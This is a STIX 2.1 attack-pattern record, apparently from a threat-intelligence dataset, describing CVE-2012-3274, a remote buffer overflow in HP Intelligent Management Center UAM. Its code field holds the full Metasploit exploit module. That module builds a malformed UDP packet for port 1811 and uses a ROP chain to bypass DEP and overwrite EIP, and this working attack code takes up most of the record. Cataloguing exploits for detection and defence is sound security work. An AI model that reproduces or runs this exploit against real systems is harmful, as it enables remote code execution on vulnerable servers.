{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e5bcfdbc-c5e9-4b74-a6b7-d4eda305fe7b",
    "created": "2024-08-14T16:47:07.743783Z",
    "modified": "2024-08-14T16:47:07.743787Z",
    "name": "HP Intelligent Management Center UAM Buffer Overflow",
    "description": " This module exploits a remote buffer overflow in HP Intelligent Management Center UAM. The vulnerability exists in the uam.exe component, when using sprint in a insecure way for logging purposes. The vulnerability can be triggered by sending a malformed packet to the 1811/UDP port. The module has been successfully tested on HP iMC 5.0 E0101 and UAM 5.0 E0102 over Windows Server 2003 SP2 (DEP bypass).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_imc_uam.rb",
            "external_id": "hp_imc_uam.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-3274"
        },
        {
            "source_name": "reference",
            "url": "https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c03589863"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP Intelligent Management Center UAM Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a remote buffer overflow in HP Intelligent Management Center\n        UAM. The vulnerability exists in the uam.exe component, when using sprint in a\n        insecure way for logging purposes. The vulnerability can be triggered by sending a\n        malformed packet to the 1811/UDP port. The module has been successfully tested on\n        HP iMC 5.0 E0101 and UAM 5.0 E0102 over Windows Server 2003 SP2 (DEP bypass).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'e6af8de8b1d4b2b6d5ba2610cbf9cd38', # Vulnerability discovery\n          'sinn3r', # Metasploit module\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2012-3274'],\n          ['OSVDB', '85060'],\n          ['BID', '55271'],\n          ['ZDI', '12-171'],\n          ['URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c03589863']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x0d\\x0a\",\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\", # Stack adjustment # add esp, -3500\n          'Space' => 3925,\n          'DisableNops' => true\n        },\n      'Platform'       => ['win'],\n      'Targets'        =>\n        [\n          [ 'HP iMC 5.0 E0101 / UAM 5.0 E0102 on Windows 2003 SP2',\n            {\n              'Offset' => 4035,\n            }\n          ]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2012-08-29',\n      'DefaultTarget'  => 0))\n\n    register_options([Opt::RPORT(1811)])\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\")[0].to_i\n  end\n\n  def nop\n    return make_nops(4).unpack(\"V\")[0].to_i\n  end\n\n  def send_echo_reply(operator)\n    packet = [0xF7103D21].pack(\"N\") # command id\n    packet << rand_text(18)\n    packet << [0x102].pack(\"n\") # watchdog command type => echo reply\n    packet << \"AAAA\" # ip (static to make offset until EIP static)\n    packet << \"AA\" # port (static to make offset until EIP static)\n    packet << operator # Operator max length => 4066, in order to bypass packet length restriction: 4096 total\n\n    connect_udp\n    udp_sock.put(packet)\n    disconnect_udp\n  end\n\n\n  def exploit\n\n    # ROP chain generated with mona.py - See corelan.be\n    rop_gadgets =\n      [\n        0x77bb2563, # POP EAX # RETN\n        0x77ba1114, # <- *&VirtualProtect()\n        0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN\n        junk,\n        0x77bb0c86, # XCHG EAX,ESI # RETN\n        0x77bc9801, # POP EBP # RETN\n        0x77be2265, # ptr to 'push esp #  ret'\n        0x77bb2563, # POP EAX # RETN\n        0x03C0990F,\n        0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)\n        0x77bb48d3, # POP EBX, RET\n        0x77bf21e0, # .data\n        0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN\n        0x77bbfc02, # POP ECX # RETN\n        0x77bef001, # W pointer (lpOldProtect) (-> ecx)\n        0x77bd8c04, # POP EDI # RETN\n        0x77bd8c05, # ROP NOP (-> edi)\n        0x77bb2563, # POP EAX # RETN\n        0x03c0984f,\n        0x77bdd441, # SUB EAX, 03c0940f\n        0x77bb8285, # XCHG EAX,EDX # RETN\n        0x77bb2563, # POP EAX # RETN\n        nop,\n        0x77be6591, # PUSHAD # ADD AL,0EF # RETN\n      ].pack(\"V*\")\n\n    bof = rand_text(14)\n    bof << rop_gadgets\n    bof << payload.encoded\n    bof << \"C\" * (target['Offset'] - 14 - rop_gadgets.length - payload.encoded.length)\n    bof << [0x77bb0c86].pack(\"V\") # EIP => XCHG EAX,ESI # RETN # from msvcrt.dll\n    bof << [0x77bcc397].pack(\"V\") # ADD EAX,2C # POP EBP # RETN # from msvcrt.dll\n    bof << [junk].pack(\"V\") # EBP\n    bof << [0x77bcba5e].pack(\"V\") # XCHG EAX,ESP # RETN # from msvcrt.dll\n\n    print_status(\"Trying target #{target.name}...\")\n    send_echo_reply(rand_text(20)) # something like... get up! ?\n    send_echo_reply(bof) # exploit\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-29",
    "x_mitre_platforms": [
        "['win']"
    ]
}